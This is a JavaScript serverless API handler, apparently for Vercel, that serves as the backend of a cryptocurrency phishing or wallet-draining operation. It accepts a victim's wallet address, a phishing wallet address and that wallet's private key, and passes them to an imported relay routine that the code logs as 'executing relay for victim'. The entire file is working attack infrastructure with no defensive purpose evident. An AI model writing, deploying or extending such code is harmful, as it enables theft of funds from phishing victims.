'use strict';

const path = require('path');

module.exports = async (req, res) => {
    // Enable CORS for Vercel
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed. Use POST.' });
    }

    try {
        const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount } = req.body || {};

        if (!victimAddress || !phishingAddress || !phishingPrivateKey) {
            return res.status(400).json({
                error: 'Missing required parameters (victimAddress, phishingAddress, phishingPrivateKey).',
            });
        }

        // Dynamic import for ESM module
        const relayPath = 'file://' + path.join(process.cwd(), 'src', 'js', 'relay.mjs');
        const { executeRelay } = await import(relayPath);

        console.log(`[Vercel] Executing relay for victim: ${victimAddress}`);
        const result = await executeRelay({
            victimAddress,
            phishingAddress,
            phishingPrivateKey,
            fundAmount: fundAmount || '0.00002',
        });

        // BigInt serialization fix
        const resultJson = JSON.stringify(result, (key, value) =>
            typeof value === 'bigint' ? value.toString() : value
        );

        return res.status(200).send(resultJson);
    } catch (err) {
        console.error('[Vercel] Relay execution failed:', err.message);
        return res.status(500).json({ error: err.message });
    }
};
